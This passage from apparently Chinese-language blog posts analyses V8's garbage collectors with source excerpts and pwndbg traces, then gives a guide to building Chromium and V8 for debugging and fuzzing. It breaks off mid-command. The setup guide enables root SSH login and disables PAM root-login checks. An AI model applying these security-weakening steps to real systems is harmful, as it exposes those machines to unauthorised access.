generation）的“区域（nursery）”中分配。在垃圾回收中幸存下来后，对象被复制到中间代（intermediate generation），它仍然是新生代的一部分。在另一次垃圾回收中幸存下来后，这些对象被移动到老年代（old generation）（见图 1）。\n\n文章中介绍了三种新生代使用的GC复制算法\n\n单线程的GC复制算法。在v6.2之前v8使用的是Cheney的GC复制算法。也就是利用迭代方式实现的。基本和算法篇的描述一致。单线程Cheney算法最初设计时考虑到了最优的单核性能。但从那时起，时代变了。即使在低端的移动设备上，CPU内核也是有很大提升。更重要的是，这些内核通常都是正常运行的。为了充分利用这些内核，V8垃圾收集器必须进行现代化改造。\n并行 Mark-Evacuate。多个线程同时进行新生代对象的复制，这时就需要将对象进行标记，复制完成后将对象取消标记，此时不可避免地to空间会碎片化，这时最后进行压缩的操作。并行标记最大优点是可以确切标记的活动对象。可以通过移动和重链接包含活动对象的页面来避免复制，这些活动对象也是由完整的Mark-Sweep-Compact收集器执行的。然而，在实践中，这在综合基准测试中很常见，很少出现在真正的网站上。并行并行标记的缺点是执行三个单独的锁步阶段的开销。当在堆上调用垃圾收集器时，这种开销尤其明显，堆上的对象大多是死对象，这是许多实际web页面的情况。\n并行Scavenger将标记-复制-修改指针过程变为原子过程，V8使用多线程和负载平衡机制来扫描Root(增量回收)。\n\n\n\n\nTracing from JS to the DOM and back again发布时间 2018-03-01\n功能：Chrome 66以后的版本可以在DevTools中追踪跨v8对象与DOM对象的访问。\n背景：当由于忘记释放无意申请的空间时将会发生内存泄露，原始的DevTools无法跨DOM追踪到js代码，新增的该功能可以更精确的定位到发生泄露的具体对象或函数。\n此时只第一行精准定位到了global_cariable\n\n此时追踪到了v8的EventListener函数\n\n并发标记发布时间 2018-06-11\n为了减少stop-the-world的问题采用了增量垃圾回收（三色标记法），V8 使用 Dijkstra 风格的写屏障（write-barrier）机制来解决标记遗漏的问题，但我们也说过，加入写屏障势必降低应用程序的吞吐量，所以可以通过增加线程的方式来处理这个问题，主要方式为并行和并发。\n\n然而最终，主线程通过扫描 root 并填充标记工作表来启动标记。之后，它会在工作线程中发布并发标记任务。工作线程通过合作排除标记工作表来帮助主线程加快标记进度。偶尔主线程通过处理 bailout worklist 和标记工作表来参与标记。标记工作表变空之后，主线程完成垃圾收集。在最终确定期，主线程重新扫描 root，可能会发现更多的白色对象。这些对象在工作线程的帮助下被并行标记。\n\n2019年更新的Orinoco讨论发布时间 2019-01-03\n相当于对之前提到的技术进行总结。\nv8宏观上采用了分代垃圾回收的技术。基于的理论是代际假说（The Generational Hypothesis）；代际假说表明很多对象在刚刚分配后随即就释放掉了。新生代使用了前面提到的并行Scavenger技术，核心是GC复制算法。老年代使用了GC标记-清除算法。至于整理，v8采用了一种叫做碎片启发式（fragmentation heuristic）的算法来整理内存页。由于分配内存空间给很多常驻内存（ long-living）的对象时，复制这些对象会带来很高的成本。所以v8只选择整理碎片化比较严重的内存页，并且对其他内存页只进行清除而不是也同样复制活动对象。\nv8中采用了并行垃圾回收、并发垃圾回收、增量式垃圾回收、空闲时回收等方式大大提升了v8的性能。前面也都提到过相关的技术。\nScavenger 回收器将新生代的垃圾回收时间减少了大约 20% - 50%，空闲时垃圾回收器在 Gmail 网页应用空闲的时候将 JavaScript 堆内存减少了 45%。并发标记清理可以减少大型 WebGL 游戏的主线程暂停时间，最多可以减少 50%。\n最后提到了BLINK本身也是有一个垃圾收集器叫做Olipan，此时Orinoco尚未与其进行联动。\nhigh-performance-cpp-gc发布时间 2020-05-26\n启用Oilpan项目的目的是为了用于管理 C++ 内存（因为BLINK引擎对象使用C++实现），该内存可以使用跨组件跟踪连接到 V8，该组件将耦合的 C++/JavaScript 对象图视为一个堆（heap）。 Blink 中实现了 Oilpan，但以垃圾收集库的形式迁移到了 V8。目标是使所有 V8 嵌入程序和更多的 C++ 开发人员都可以轻松使用 C ++ 垃圾回收。\n目前Oilpan的定位相当于一个C++对象回收的模块库，任何项目都可调用。在v8中是与Orinoco配合使用，虽然功能重合，但是Oilpan可以对C++进行GC。\n在目前的文章中介绍的是Oilpan的GC标记-清除算法。在标记阶段实现了并发标记。对于清除阶段，使用了增量与并发清除技术。\n源码分析// incremental-marking.cc\t并发标记根索引的对象，将对象涂灰并压入处理栈class IncrementalMarkingRootMarkingVisitor : public RootVisitor &#123;    ...  void VisitRootPointer(Root root, const char* description,                        FullObjectSlot p) override &#123;    MarkObjectByPointer(p);  &#125;... private:  void MarkObjectByPointer(FullObjectSlot p) &#123;    Object obj = *p;    if (!obj.IsHeapObject()) return;    heap_-&gt;incremental_marking()-&gt;WhiteToGreyAndPush(HeapObject::cast(obj));  &#125;  Heap* heap_;&#125;;// incremental-marking-inl.h\tWhiteToGreyAndPush函数如名字，将区涂灰并压栈，再往下跟没有意义了MarkCompactCollector* const collector_;MarkingWorklists::Local* local_marking_worklists() const &#123;    return collector_-&gt;local_marking_worklists();&#125;bool IncrementalMarking::WhiteToGreyAndPush(HeapObject obj) &#123;  if (marking_state()-&gt;WhiteToGrey(obj)) &#123;    local_marking_worklists()-&gt;Push(obj);    return true;  &#125;  return false;&#125;// incremental-marking.cc\t将对象涂黑void IncrementalMarking::MarkBlackBackground(HeapObject obj, int object_size) &#123;  MarkBit mark_bit = atomic_marking_state()-&gt;MarkBitFrom(obj);  Marking::MarkBlack&lt;AccessMode::ATOMIC&gt;(mark_bit);  MemoryChunk* chunk = MemoryChunk::FromHeapObject(obj);  IncrementLiveBytesBackground(chunk, static_cast&lt;intptr_t&gt;(object_size));&#125;// heap\\incremental-marking.cc\t这个是上面官方博客提到的优化措施，将老年代的所有对象涂黑，这样可以一定程度上减缓GC的压力void IncrementalMarking::EnsureBlackAllocated(Address allocated, size_t size) &#123;  if (black_allocation() &amp;&amp; allocated != kNullAddress) &#123;    HeapObject object = HeapObject::FromAddress(allocated);    if (marking_state()-&gt;IsWhite(object) &amp;&amp; !Heap::InYoungGeneration(object)) &#123;      if (heap_-&gt;IsLargeObject(object)) &#123;        marking_state()-&gt;WhiteToBlack(object);      &#125; else &#123;        Page::FromAddress(allocated)-&gt;CreateBlackArea(allocated,                                                      allocated + size);      &#125;    &#125;  &#125;&#125;\n\nGC reason\n// heap.h\t枚举了需要用到GC的情况，可以以此为入口点全局搜索字符串来找到所有用到GC的情况。头文件2600行我淦enum class GarbageCollectionReason &#123;  kUnknown = 0,  kAllocationFailure = 1,  kAllocationLimit = 2,  kContextDisposal = 3,  kCountersExtension = 4,  kDebugger = 5,  kDeserializer = 6,  kExternalMemoryPressure = 7,  kFinalizeMarkingViaStackGuard = 8,  kFinalizeMarkingViaTask = 9,  kFullHashtable = 10,  kHeapProfiler = 11,  kTask = 12,  kLastResort = 13,  kLowMemoryNotification = 14,  kMakeHeapIterable = 15,  kMemoryPressure = 16,  kMemoryReducer = 17,  kRuntime = 18,  kSamplingProfiler = 19,  kSnapshotCreator = 20,  kTesting = 21,  kExternalFinalize = 22,  kGlobalAllocationLimit = 23,  kMeasureMemory = 24,  kBackgroundAllocationFailure = 25,  // If you add new items here, then update the incremental_marking_reason,  // mark_compact_reason, and scavenge_reason counters in counters.h.  // Also update src/tools/metrics/histograms/enums.xml in chromium.&#125;;// heap.cc\t搜索GarbageCollectionReason::kRuntime，定位到该函数，首先以原子方式完成增量标记，之后精确的回收全部的垃圾。void Heap::PreciseCollectAllGarbage(int flags,                                    GarbageCollectionReason gc_reason,                                    const GCCallbackFlags gc_callback_flags) &#123;  if (!incremental_marking()-&gt;IsStopped()) &#123;    FinalizeIncrementalMarkingAtomically(gc_reason);  &#125;  CollectAllGarbage(flags, gc_reason, gc_callback_flags);&#125;\n\n之后动态调试追踪一下这个函数，我们使用如下代码触发Minor GC\nvar a = [];for (var i = 0; i &lt; 100000; i++) &#123; a[i] = new String(&quot;&quot;); &#125;\n\n函数原型如下\nbool Heap::CollectGarbage(AllocationSpace space,                          GarbageCollectionReason gc_reason,                          const v8::GCCallbackFlags gc_callback_flags) \n\n下断点进行调试\nb v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)# 可以打印出参数信息以及函数调用栈，可以发现gc_reason为kAllocationFailure，当我们申请太多对象时如果空闲空间不够了则需要对堆空间进行垃圾回收pwndbg&gt; print space$1 = v8::internal::NEW_SPACEpwndbg&gt; print gc_reason$2 = v8::internal::GarbageCollectionReason::kAllocationFailurepwndbg&gt; print gc_callback_flags$3 = v8::kNoGCCallbackFlagspwndbg&gt; k#0  v8::internal::Heap::CollectGarbage (this=0x27d000009ee0, space=v8::internal::NEW_SPACE, gc_reason=v8::internal::GarbageCollectionReason::kAllocationFailure, gc_callback_flags=v8::kNoGCCallbackFlags) at ../../src/heap/heap.cc:1527#1  0x00007fc24d083295 in v8::internal::Heap::AllocateRawWithLightRetrySlowPath (this=0x27d000009ee0, size=16, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode, alignment=v8::internal::kWordAligned) at ../../src/heap/heap.cc:5090#2  0x00007fc24d0833eb in v8::internal::Heap::AllocateRawWithRetryOrFailSlowPath (this=0x27d000009ee0, size=16, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode, alignment=v8::internal::kWordAligned) at ../../src/heap/heap.cc:5106#3  0x00007fc24d03be1b in v8::internal::Heap::AllocateRawWith&lt;(v8::internal::Heap::AllocationRetryMode)1&gt; (this=0x27d000009ee0, size=16, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode, alignment=v8::internal::kWordAligned) at ../../src/heap/heap-inl.h:310#4  0x00007fc24d0234c5 in v8::internal::Factory::NewFillerObject (this=0x27d000000000, size=16, double_align=false, allocation=v8::internal::AllocationType::kYoung, origin=v8::internal::AllocationOrigin::kGeneratedCode) at ../../src/heap/factory.cc:299#5  0x00007fc24d851183 in v8::internal::__RT_impl_Runtime_AllocateInYoungGeneration (args=..., isolate=0x27d000000000) at ../../src/runtime/runtime-internal.cc:393#6  0x00007fc24d850aa0 in v8::internal::Runtime_AllocateInYoungGeneration (args_length=2, args_object=0x7ffe42bb58d0, isolate=0x27d000000000) at ../../src/runtime/runtime-internal.cc:373#7  0x00007fc24c62937f in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit () from /root/v8/v8/v8/out/x64.debug/libv8.so#8  0x00007fc24c7482b1 in Builtins_StringConstructor () from /root/v8/v8/v8/out/x64.debug/libv8.so#9  0x00007fc24c365461 in Builtins_JSBuiltinsConstructStub () from /root/v8/v8/v8/out/x64.debug/libv8.so... ► 1534   DevToolsTraceEventScope devtools_trace_event_scope(   1535       this, IsYoungGenerationCollector(collector) ? &quot;MinorGC&quot; : &quot;MajorGC&quot;,   1536       GarbageCollectionReasonToString(gc_reason));pwndbg&gt; print IsYoungGenerationCollector(collector)$5 = truepwndbg&gt; print collector$6 = v8::internal::SCAVENGER# 这里可以验证使用的GC方式为MinorGC# 之后调用了v8::internal::Heap::PerformGarbageCollection函数来执行垃圾收集的工作，在该函数中依次调用了  tracer()-&gt;StartInSafepoint();GarbageCollectionPrologueInSafepoint(); EnsureFromSpaceIsCommitted();等函数做一些前置准备，之后进行判断  switch (collector) &#123;    case MARK_COMPACTOR:      MarkCompact();      break;    case MINOR_MARK_COMPACTOR:      MinorMarkCompact();      break;    case SCAVENGER:      Scavenge();      break;  &#125;# 很明显这次进入了Scavenge()执行。void Heap::Scavenge() &#123;  ...  // Implements Cheney&#x27;s copying algorithm  LOG(isolate_, ResourceEvent(&quot;scavenge&quot;, &quot;begin&quot;));  scavenger_collector_-&gt;CollectGarbage();  LOG(isolate_, ResourceEvent(&quot;scavenge&quot;, &quot;end&quot;));  SetGCState(NOT_IN_GC);&#125;# 观察上面的代码，前面的东西我们不关心，他做了一些准备工作，到后面的时候执行了scavenger_collector_-&gt;CollectGarbage(); 跟进进入到heap\\scavenger.cc文件中（注释中告诉我们使用了Cheney&#x27;s copying algorithm）# 跟进入ScavengerCollector::CollectGarbage()函数，发现每个过程都用块级作用域区分出来了，并标注了注释，这样方便理解了不少\n\nScavenger垃圾回收// 首先建立一个全局的概念，v8官方博客已经描述了使用的相关技术，核心就是更好的利用了多线程，并行Scavenger将标记-复制-修改指针过程变为原子过程，V8使用多线程和负载平衡机制来扫描Root(增量回收)。// 前面有清除堆的操作，不太懂这里的目的是什么// 1、Try to finish sweeping here, such that the following code doesn&#x27;t need to pause &amp; resume sweeping.// 2、Pause the concurrent sweeper.// 3、Identify weak unmodified handles. Requires an unmodified graph.// 之后对根进行了复制，主要就是两个函数IterateRoots以及IterateYoungStrongAndDependentRoots&#123;    // Copy roots.    TRACE_GC(heap_-&gt;tracer(), GCTracer::Scope::SCAVENGER_SCAVENGE_ROOTS);    // Scavenger treats all weak roots except for global handles as strong.    // That is why we don&#x27;t set skip_weak = true here and instead visit    // global handles separately.    base::EnumSet&lt;SkipRoot&gt; options(&#123;SkipRoot::kExternalStringTable,                                     SkipRoot::kGlobalHandles,                                     SkipRoot::kOldGeneration&#125;);    if (V8_UNLIKELY(FLAG_scavenge_separate_stack_scanning)) &#123;        options.Add(SkipRoot::kStack);    &#125;    heap_-&gt;IterateRoots(&amp;root_scavenge_visitor, options);    isolate_-&gt;global_handles()-&gt;IterateYoungStrongAndDependentRoots(        &amp;root_scavenge_visitor);    scavengers[kMainThreadId]-&gt;Flush();&#125;// 之后并行移动全部的对象，多线程std::move(memory_chunks)&#123;    // Parallel phase scavenging all copied and promoted objects.    TRACE_GC(heap_-&gt;tracer(), GCTracer::Scope::SCAVENGER_SCAVENGE_PARALLEL);    V8::GetCurrentPlatform()        -&gt;PostJob(v8::TaskPriority::kUserBlocking,                  std::make_unique&lt;JobTask&gt;(this, &amp;scavengers,                                            std::move(memory_chunks),                                            &amp;copied_list, &amp;promotion_list))        -&gt;Join();    DCHECK(copied_list.IsEmpty());    DCHECK(promotion_list.IsEmpty());&#125;&#123;      // Parallel phase scavenging all copied and promoted objects.      TRACE_GC(heap_-&gt;tracer(), GCTracer::Scope::SCAVENGER_SCAVENGE_PARALLEL);      V8::GetCurrentPlatform()          -&gt;PostJob(v8::TaskPriority::kUserBlocking,                    std::make_unique&lt;JobTask&gt;(this, &amp;scavengers,                                              std::move(memory_chunks),                                              &amp;copied_list, &amp;promotion_list))          -&gt;Join();      DCHECK(copied_list.IsEmpty());      DCHECK(promotion_list.IsEmpty());&#125;&#123;    // Parallel phase scavenging all copied and promoted objects.    TRACE_GC(heap_-&gt;tracer(), GCTracer::Scope::SCAVENGER_SCAVENGE_PARALLEL);    V8::GetCurrentPlatform()        -&gt;PostJob(v8::TaskPriority::kUserBlocking,                  std::make_unique&lt;JobTask&gt;(this, &amp;scavengers,                                            std::move(memory_chunks),                                            &amp;copied_list, &amp;promotion_list))        -&gt;Join();    DCHECK(copied_list.IsEmpty());    DCHECK(promotion_list.IsEmpty());&#125;if (V8_UNLIKELY(FLAG_scavenge_separate_stack_scanning)) &#123;    IterateStackAndScavenge(&amp;root_scavenge_visitor, &amp;scavengers,                            kMainThreadId);    DCHECK(copied_list.IsEmpty());    DCHECK(promotion_list.IsEmpty());&#125;&#123;    // Scavenge weak global handles.    TRACE_GC(heap_-&gt;tracer(),             GCTracer::Scope::SCAVENGER_SCAVENGE_WEAK_GLOBAL_HANDLES_PROCESS);    isolate_-&gt;global_handles()-&gt;MarkYoungWeakDeadObjectsPending(        &amp;IsUnscavengedHeapObjectSlot);    isolate_-&gt;global_handles()-&gt;IterateYoungWeakDeadObjectsForFinalizers(        &amp;root_scavenge_visitor);    scavengers[kMainThreadId]-&gt;Process();    DCHECK(copied_list.IsEmpty());    DCHECK(promotion_list.IsEmpty());    isolate_-&gt;global_handles()-&gt;IterateYoungWeakObjectsForPhantomHandles(        &amp;root_scavenge_visitor, &amp;IsUnscavengedHeapObjectSlot);&#125;&#123;    // Finalize parallel scavenging.    TRACE_GC(heap_-&gt;tracer(), GCTracer::Scope::SCAVENGER_SCAVENGE_FINALIZE);    DCHECK(surviving_new_large_objects_.empty());    for (auto&amp; scavenger : scavengers) &#123;        scavenger-&gt;Finalize();    &#125;    scavengers.clear();    HandleSurvivingNewLargeObjects();&#125;\n\nMARK_COMPACTOR垃圾回收在上面的调试过程达到了case的步骤\nswitch (collector) &#123;    case MARK_COMPACTOR:        MarkCompact();        break;    case MINOR_MARK_COMPACTOR:        MinorMarkCompact();        break;    case SCAVENGER:        Scavenge();        break;&#125;\n\n这次我们要分析Major GC，所以自然进入 MarkCompact函数执行\n编写如下代码触发该case\nnew ArrayBuffer(0x80000000);\n\n此时触发了MajorGC\npwndbg&gt; print collector$1 = v8::internal::MARK_COMPACTOR\n\n还是先看下整体的流程\n// 逻辑比较清晰， mark_compact_collector()-&gt;Prepare()进行增量标记环境的创建，MarkCompactPrologue函数清理各个位置的缓存。void Heap::MarkCompact() &#123;  PauseAllocationObserversScope pause_observers(this);  SetGCState(MARK_COMPACT);  LOG(isolate_, ResourceEvent(&quot;markcompact&quot;, &quot;begin&quot;));  CodeSpaceMemoryModificationScope code_modifcation(this);  UpdateOldGenerationAllocationCounter();  uint64_t size_of_objects_before_gc = SizeOfObjects();  mark_compact_collector()-&gt;Prepare();  ms_count_++;  MarkCompactPrologue();  mark_compact_collector()-&gt;CollectGarbage();  LOG(isolate_, ResourceEvent(&quot;markcompact&quot;, &quot;end&quot;));  MarkCompactEpilogue();  if (FLAG_allocation_site_pretenuring) &#123;    EvaluateOldSpaceLocalPretenuring(size_of_objects_before_gc);  &#125;  old_generation_size_configured_ = true;  // This should be updated before PostGarbageCollectionProcessing, which  // can cause another GC. Take into account the objects promoted during  // GC.  old_generation_allocation_counter_at_last_gc_ +=      static_cast&lt;size_t&gt;(promoted_objects_size_);  old_generation_size_at_last_gc_ = OldGenerationSizeOfObjects();  global_memory_at_last_gc_ = GlobalSizeOfObjects();&#125;// 核心的标记压缩步骤，这里由于采用了增量垃圾回收，所以采用了三色标记法，使用了迪杰斯特拉的写入屏障。void MarkCompactCollector::CollectGarbage() &#123;  // Make sure that Prepare() has been called. The individual steps below will  // update the state as they proceed.  DCHECK(state_ == PREPARE_GC);#ifdef ENABLE_MINOR_MC  heap()-&gt;minor_mark_compact_collector()-&gt;CleanupSweepToIteratePages();#endif  // ENABLE_MINOR_MC  MarkLiveObjects();\t\t\t\t// 这里采用了并发标记与增量标记  ClearNonLiveReferences();\t\t\t // Clear non-live references in weak cells, transition and descriptor arrays, and deoptimize dependent code of non-live maps.  VerifyMarking();\t\t\t\t\t// 验证了活动对象是否被涂黑。跟踪调试发现变量FLAG_verify_heap为false，所以并没有验证。猜测可能特殊情况才需要对标记进行验证保证安全，否则为了效率考虑一般不会多加一个验证的步骤，属实没有必要。  heap()-&gt;memory_measurement()-&gt;FinishProcessing(native_context_stats_);  RecordObjectStats();\t\t\t\t// 这里判断对象的状态是否被记录，如果没有则将其记录，调试时发现此时无需记录，函数直接返回。  StartSweepSpaces();\t\t\t\t// 通过在主线程上贡献并设置其他页面进行扫描来开始扫描空间。 不启动清扫任务。设置的扫描空间为old_space、code_space、map_space。之后执行StartSweeping。StartSweeping函数内部会对对象按照大小进行排序。排序是为了使压缩更有效：通过首先清除具有最多空闲字节的页面，我们更有可能在撤出页面时，已经清除的页面将有足够的空闲字节来容纳要移动的对象（并且 因此，我们不需要等待更多页面被扫描来移动这些对象）。 由于地图不会移动，因此在扫描它们之前无需对 MAP_SPACE 中的页面进行排序。  Evacuate();\t\t\t\t\t\t// 清除阶段的操作。重要函数执行顺序如下：EvacuatePrologue、EvacuatePagesInParallel、UpdatePointersAfterEvacuation、FreeQueuedChunks、EvacuateEpilogue。对new_space和old_space的对象进行压缩最后更新指针。看起来仍是通过GC标记-压缩方式来进行实现的。并未读懂启发式压缩的过程。  Finish();\t\t\t\t\t\t\t// 调用SweepArrayBufferExtensions，确保young空间和old空间为null。&#125;\n\n就算了解了相关的算法知识以及有较为丰富的注释，但观察源代码理解这个庞大的GC过程仍然比较痛苦，尤其是和并发与并行沾上边，而且需要对某些位置进行mutex限制访问，目前对于源代码的分析就简单于此，笔者需要补充自己的实力与经验再去挑战一下v8的GC实现了。\n参考链接《垃圾回收的算法与实现》                                                                                            // [日]中村成洋    相川光\nhttps://www.cnblogs.com/qqmomery/category/719315.html                                    // GC总结\nhttps://www.jianshu.com/p/12544c0ad5c1                                                                // 三色标记法详解\nhttps://juejin.cn/post/6896363424398180359                                                        // GC总结\nhttps://juejin.cn/post/6844904161654341646                                                        //    v8相关总结\nhttps://time.geekbang.org/column/intro/296?tab=catalog                                        // 图解google v8\n"},{"title":"ubuntu chromium+v8调试环境搭建","url":"/2022/02/24/ubuntu-chromium-v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","content":"ubuntu chromium+v8调试环境搭建Ubuntu环境配置1、允许root登录并进行ubuntu初始修改\nsudo passwd rootcp /home/ubuntu/.bashrc /root/apt update &amp;&amp; apt install ssh vim python git libproxy-tools re2c g++vi /etc/ssh/sshd_config\t\t\t# 修改 PermitRootLogin yesvi /etc/pam.d/gdm-autologin\t\t# 注释auth   required        pam_succeed_if.so user != root quiet_successvi /etc/pam.d/gdm-password\t\t# 注释auth   required        pam_succeed_if.so user != root quiet_successvi /root/.profile\t\t\t    # 改成 tty -s &amp;&amp; mesg n || true\n\n2、配置linux全局代理，使终端可以访问墙外的v8编译相关资源\n比如qv2ray，相关链接：https://www.zsxcool.com/7137.html\n再比如Trojan-QT5，相关链接：https://github.com/Shadowsocks-Wiki/shadowsocks/blob/master/zh_CN/trojan/ubuntu-trojan-qt5-setup-guide.md\n2、一般采用虚拟机搭建v8环境，方便环境的维护，推荐虚拟机采用vmware NAT那块网卡，这时我们在本地做全局代理时（比如Netch），虚拟机内部也可以有比较顺畅的网络环境。\nv8环境配置下载depot_tools，v8并进行编译\nmkdir /root/tools &amp;&amp; cd /root/toolsgit clone https://chromium.googlesource.com/chromium/tools/depot_tools.git /root/tools/depot_toolsecho &#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27; &gt;&gt; /etc/profileecho &#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27; &gt;&gt; ~/.bashrcsource /etc/profilesource ~/.bashrc或者source ~/.zshrc# Todo 忘记是否需要自行安装Ninja了。。。mkdir /root/v8 &amp;&amp; cd /root/v8fetch v8\t\t\t\t\t\t \t  # 这个可能会花很长时间，取决于个人的网络环境，如果中断了则 gclient sync同步cd v8# git reset --hard [commit hash]\t\t\t# 切换版本，后面跟上commit的hash值，可选# gclient syncsudo ./build/install-build-deps.sh --no-chromeos-fonts\t\t\t# 在linux系统中这个命令是需要的gclient sync  # 同步更新# 编译可执行文件tools/dev/gm.py x64.debug # 编译 debug 版本\t\t\t编译的过程可能会花上比较长的时间tools/dev/gm.py x64.release # 编译 release 版本# 或通过gn构建，方便我们自定义参数，比如下面加入了asan检测和afl支持，传统的afl fuzz整个程序（d8）很难会有产出，如果非要用afl可以自行编写harness，类似libfuzzergn gen out/use_afl --args=&quot;is_debug=true is_component_build=true is_asan = true use_afl = true optimize_for_fuzzing = true&quot;ninja -C out/use_afl d8\n\n过程中遇到的问题\n1、running depot tools as root is sad\n如果root用户使用该工具会弹出该警告，无视即可\n2、遇到 NOTICE: You have PROXY values set in your environment, but gsutilin depot_tools does not (yet) obey them.Also, –no_auth prevents the normal BOTO_CONFIG environmentvariable from being used.To use a proxy in this situation, please supply those settingsin a .boto file pointed to by the NO_AUTH_BOTO_CONFIG environmentvariable.\n缺少代理的环境变量，基本在你自己在虚拟机内布置代理环境才会出现这个问题，采用NAT网卡一般不会出现这个问题，踩太多坑了。\nmkdir /root/tools/.botovi .boto# [Boto]# debug = 0# num_retries = 10# # proxy = 127.0.0.1# proxy_port = 58591echo &#x27;export NO_AUTH_BOTO_CONFIG=&quot;/root/tools/.boto&quot;&#x27; &gt;&gt; /etc/profileecho &#x27;export NO_AUTH_BOTO_CONFIG=&quot;/root/tools/.boto&quot;&#x27; &gt;&gt; ~/.bashrcsource /etc/profilesource ~/.bashrc或者source ~/.zshrc\n\n3、Failed to download https://commondatastorage.googleapis.com/chrome-linux-sysroot/toolchain/43a87bbebccad99325fdcf34166295b121ee15c7/debian_sid_amd64_sysroot.tar.xzError: Command ‘vpython build/linux/sysroot_scripts/install-sysroot.py –arch=x64’ returned non-zero exit status 1 in /root/v8/v8\n出现这种问题是因为网络原因，可以重新进行gclient sync或更换代理服务器\n4、Error: client not configured; see ‘gclient config’\n# gclient config https://chromium.googlesource.com/chromium/src.gitgclient config https://chromium.googlesource.com/v8/v8.gitgclient runhooks\n\n参考链接：https://stackoverflow.com/questions/8684282/gclient-runhooks-fails\nchromium环境配置有了上面v8搭建的过程，这里的过程看起来就更容易理解一些，实际上二者的搭建过程没有太大的差距，因为google官方将搭建过程都封装到了depot_tools中了。二者的体量差别还是比较大的，截至2022.1，chromium最新大概5w多个文件，而v8在2k文件左右\nmkdir ~/chromium &amp;&amp; cd ~/chromiumfetch --nohooks chromiumcd src./build/install-build-deps.shgclient runhooks# git reset --hard [commit hash]\t\t\t# 切换版本，后面跟上commit的hash值，可选# gclient sync# 配置编译选项，可以使用 use_afl = true 参数开启afl fuzz功能，但目前不知道如何结合afl对chromium进行fuzz，而且在不编写harness的情况下效率还是比较低的。gn gen out/asan_debug --args=&quot;is_debug=true is_component_build=true is_asan = true&quot; \t# 开始编译，可能需要数个小时autoninja -C out/asan_debug chrome\n\n启动chromium时，asan提示odr-violation报错\n# Kiprey @ Kipwn in /usr/class/chromium [14:19:24] C:1$ ./src/out/asan_debug/chrome===================================================================189815==ERROR: AddressSanitizer: odr-violation (0x7f44b9504700):  [1] size=40 &#x27;vtable for media::VaapiDmaBufVideoFrameMapper&#x27; ../../media/gpu/vaapi/vaapi_dmabuf_video_frame_mapper.cc  [2] size=40 &#x27;vtable for media::VaapiDmaBufVideoFrameMapper&#x27; ../../media/gpu/vaapi/vaapi_dmabuf_video_frame_mapper.ccThese globals were registered at these points:  [1]:    #0 0x55f8a95f810d in __asan_register_globals /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_globals.cpp:360:3    #1 0x7f4471d6895b in asan.module_ctor (/usr/class/chromium/src/out/asan_debug/libservice.so+0x2b5595b)  [2]:    #0 0x55f8a95f810d in __asan_register_globals /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_globals.cpp:360:3    #1 0x7f44b87abe7b in asan.module_ctor (/usr/class/chromium/src/out/asan_debug/libmedia_gpu.so+0x335e7b)==189815==HINT: if you don&#x27;t care about these errors you may set ASAN_OPTIONS=detect_odr_violation=0SUMMARY: AddressSanitizer: odr-violation: global &#x27;vtable for media::VaapiDmaBufVideoFrameMapper&#x27; at ../../media/gpu/vaapi/vaapi_dmabuf_video_frame_mapper.cc==189815==ABORTING\n\nodr-violation这类错误我们忽略即可，因此我们需要设置一下环境变量ASAN_OPTIONS，最好编辑配置文件将其永久配置\nexport ASAN_OPTIONS=detect_odr_violation=0\n\n之后即可正常执行chrome。\n参考链接\nhttps://kiprey.github.io/2020/11/fetch-chromium/\nhttps://bbs.pediy.com/thread-252812-1.htm\nbrowser-pwn-基础知识.pdf \n\n其他1、vscode关闭代码错误提示vscode内Ctrl + Shift + P搜索：errorSquiggles，禁用错误波形曲线\n2、配置gdb插件下面可以挑选一个gdb调试工具，统一将gdb脚本的路径放入/root/.gdbinit中。\ngefgit clone https://github.com/hugsy/gef# 将gef目录下的gef.py添加进/root/.gdbinit中，内容如下# source /root/tools/gef/gef.py\n\npwndbggit clone https://github.com/pwndbg/pwndbgcd pwndbgsudo #./setup.sh# 如果显示异常，检查.gdbinit文件# source /root/tools/pwndbg/gdbinit.py\n\npedagit clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit\n\n还需要将v8的gdb插件放入gdbinit中，路径如下（路径取决于自己本机环境）\n/root/v8/v8/tools/gdbinit\n\n\n\n\n\nWindows chromium+v8调试环境搭建有了上面ubuntu安装的经验，再windows上搭建调试环境会轻松不少。\nwindows里面需要额外安装SDK以及vs，毕竟需要vs进行调试。\nv8环境配置1、下载安装vs2019或者vs2022，并配置python环境\n2、下载SDK并安装\n3、下载安装depot_tools，并配置depot_tools安装目录的环境变量并确保其在python的环境变量前\ngit clone https://chromium.googlesource.com/chromium/tools/depot_tools\n\n4、配置环境变量\n三个环境变量，编译chromium也需要他们，depot_tools的环境变量要在python的上面（vs的路径按照自己电脑的路径）\n\n\n\nDEPOT_TOOLS_WIN_TOOLCHAIN\nvs2022_install\nPATH\n\n\n\n0\nC:\\Program Files\\Microsoft Visual Studio\\2022\\Community\nC:\\software\\depot_tools\n\n\n5、运行gclient，初始化工具\ngclient\n\n6、fetch源码并更新，其他的步骤就和ubuntu的一样了\nmkdir v8 &amp;&amp; cd v8fetch v8gclient synccd v8python tools\\dev\\gm.py x64.debug\n\n如果不使用gm.py脚本，也可以使用gn工具进行构建\ncd E:\\v8\\v8gn gen --ide=vs out\\default --args=&quot;is_component_build = true is_debug = true v8_optimized_debug = false&quot;\n\n上面的命令会生成工作目录，路径为E:\\v8\\v8\\out\\Default，里面有一个all.sln的文件，使用vs打开\n之后在160个项目中找到gn_all，编译之，最后即可调试E:\\v8\\v8\\out\\Default\\d8.exe。\nchromium环境配置配置vs和SDK还有环境变量等过程和上面配置v8时一致，只是在最后fetch和编译时有些许差别\nmkdir chromium &amp;&amp; cd chromiumfetch chromiumcd srcgn gen out/debug_comp --args=&quot;is_debug=true is_component_build=true&quot; autoninja -C out/debug_comp chrome\n\n或者使用vs进行编译调试\ngn gen --ide=vs 